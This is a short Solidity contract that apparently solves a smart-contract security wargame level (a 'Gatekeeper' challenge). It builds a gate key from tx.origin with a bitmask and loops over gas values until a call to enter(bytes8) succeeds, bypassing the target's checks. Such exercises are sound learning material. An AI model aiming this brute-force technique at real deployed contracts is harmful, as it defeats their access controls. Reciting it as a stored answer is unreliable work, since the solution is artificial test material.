// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.0;

// import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol';

contract Answer {
//   using SafeMath for uint256;

    function test(address instance) external {

        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        for(uint256 i=0;i<200;i++)
        {
            uint256 gasgas = 8191 * 3 + 150 + i*2;
            (bool success, bytes memory result) = address(instance).call{gas:gasgas}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if(success){
                return;
            }
        }
        revert("");

    }

}
